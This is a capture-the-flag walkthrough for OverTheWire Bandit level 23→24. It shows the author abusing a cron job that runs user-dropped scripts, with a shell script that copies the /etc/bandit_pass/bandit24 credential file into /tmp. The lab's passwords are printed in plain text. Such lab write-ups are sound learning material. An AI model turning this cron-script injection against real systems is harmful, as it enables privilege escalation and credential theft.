# Bandit Level 23 → Level 24

## Level Goal

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Commands you may need to solve this level

chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)

### Solution:

From the previous level, we have the password:

**Password:** 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

To SSH into the server, use the following command:

**Command:**

ssh [bandit23@bandit.labs.overthewire.org](mailto:bandit1@bandit.labs.overthewire.org) -p 2220

enter the password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

bandit23@bandit:~$ ls -al /etc/cron.d/
total 44
drwxr-xr-x   2 root root  4096 Jul 17 15:59 .
drwxr-xr-x 121 root root 12288 Jul 17 15:58 ..
-rw-r--r--   1 root root   120 Jul 17 15:57 cronjob_bandit22
-rw-r--r--   1 root root   122 Jul 17 15:57 cronjob_bandit23
-rw-r--r--   1 root root   120 Jul 17 15:57 cronjob_bandit24
-rw-r--r--   1 root root   201 Apr  8 14:38 e2scrub_all
-rwx------   1 root root    52 Jul 17 15:59 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 31 00:06 .placeholder
-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

- bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
if [ "$i" != "." -a "$i" != ".." ];
then
echo "Handling $i"
owner="$(stat --format "%U" ./$i)"
if [ "${owner}" = "bandit23" ]; then
timeout -s 9 60 ./$i
fi
rm -f ./$i
fi
done

bandit23@bandit:~$ mkdir /tmp/kamisama
bandit23@bandit:$ cd /tmp/kamisama
bandit23@bandit:/tmp/kamisama$ vim [shell.sh](http://shell.sh/)

In shell.sh:

#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/kamisama/pass24.txt

bandit23@bandit:/tmp/kamisama$ ls -al
total 44
drwxrwxr-x   2 bandit23 bandit23  4096 Jul 18 06:50 .
drwxrwx-wt 675 root     root     32768 Jul 18 06:50 ..
-rw-rw-r--   1 bandit23 bandit23    70 Jul 18 06:50 [shell.sh](http://shell.sh/)
bandit23@bandit:/tmp/kamisama$ chmod o+x [shell.sh](http://shell.sh/)
bandit23@bandit:/tmp/kamisama$ ls -al
total 44
drwxrwxr-x   2 bandit23 bandit23  4096 Jul 18 06:50 .
drwxrwx-wt 675 root     root     32768 Jul 18 06:50 ..
-rw-rw-r-x   1 bandit23 bandit23    70 Jul 18 06:50 [shell.sh](http://shell.sh/)
bandit23@bandit:/tmp/kamisama$ chmod o+w .
bandit23@bandit:/tmp/kamisama$ ls -al
total 44
drwxrwxrwx   2 bandit23 bandit23  4096 Jul 18 06:50 .
drwxrwx-wt 677 root     root     32768 Jul 18 06:51 ..
-rw-rw-r-x   1 bandit23 bandit23    70 Jul 18 06:50 [shell.sh](http://shell.sh/)
bandit23@bandit:/tmp/kamisama$ cp [shell.sh](http://shell.sh/) /var/spool/bandit24/foo
bandit23@bandit:/tmp/kamisama$ cat pass24.txt
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8